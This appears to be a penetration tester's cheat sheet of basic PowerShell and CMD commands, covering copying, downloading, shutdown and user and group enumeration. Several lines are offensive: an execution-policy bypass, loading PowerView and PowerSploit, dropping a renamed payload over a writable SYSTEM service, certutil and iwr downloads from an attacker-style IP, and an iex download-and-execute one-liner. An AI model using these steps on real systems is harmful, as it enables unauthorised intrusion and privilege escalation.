---
description: The basic of Powershell and CMD
---

# Basic Command

This note was created when I was not very familiar with the Windows environment. I didn't know how to restart the machine from the command line, copy files, or import PowerShell scripts, etc.

### Basic PowerShell

Enter powershell with Execution Policy Bypass

{% code overflow="wrap" %}
```powershell
powershell -ep bypass
```
{% endcode %}

Or, if you already inside powershell session, you can set Execution Policy with this command:

{% code overflow="wrap" %}
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser
```
{% endcode %}

Load powershell script function into memory with dot sourcing:

```powershell
. .\PowerView.ps1
```

Import module to powershell:

{% code overflow="wrap" %}
```powershell
import-module .\Powerspolit.psd1
```
{% endcode %}

### Copy  & Move

How to copy file:

{% code overflow="wrap" %}
```powershell
copy source.exe destination.exe
```
{% endcode %}

How to copy directory:

```powershell
xcopy C:\source_dir D:\dest_dir /E /I /Y
```

Explanation:

* `/E` – Copies all subdirectories, including empty ones.
* `/I` – If the destination does not exist and copying more than one file, this option assumes that the destination must be a directory.
* `/Y` – Suppresses prompting to confirm you want to overwrite an existing destination file.

How to Move File or Directory

{% code overflow="wrap" %}
```powershell
move payload.exe C:\temp\service.exe
```
{% endcode %}

### Rename&#x20;

Sometimes, after found service run as SYSTEM user and writable by low user, you can drop payload to the directory and rename the payload to match the service name.

```powershell
ren Payload.exe Service.exe
```

### Download

certutil.exe

{% code overflow="wrap" %}
```powershell
certutil -urlcache -split -f https://example.com/example.txt example.txt
```
{% endcode %}

powershell.exe: Invoke-WebRequest

{% code overflow="wrap" %}
```powershell
iwr -Uri "http://172.16.8.1:9005/PowerView.ps1" -OutFile "PowerView.ps1"
```
{% endcode %}

### Download and Execute

powershell.exe: Invoke-Expression

{% code overflow="wrap" %}
```powershell
iex ((New-Object Net.WebClient).DownloadString("http://example.com/script-exec.ps1"))
```
{% endcode %}

### Restart and Shutdown

Shutdown now:

```powershell
shutdown /s /t 0 /f
```

Restart now:

{% code overflow="wrap" %}
```powershell
shutdown /r /t 0 /f
```
{% endcode %}

### Convert to Base64

{% code overflow="wrap" %}
```powershell
[convert]::ToBase64String((Get-Content -path "20230908145747_BloodHound.zip" -Encoding byte))
```
{% endcode %}

### Privileges, User, and Groups

User stuff:

```
whoami /all
whoami /priv
whoami /group
net user
net user asuka
```

Localgroup stuff:

```powershell
net localgroup
net localgroup Administrators
```

Check group member

{% code overflow="wrap" %}
```powershell
Get-LocalGroupMember -Group "Administrators"
Get-ADGroupMember -Identity Administrators | Select-Object name, objectClass,distinguishedName
```
{% endcode %}
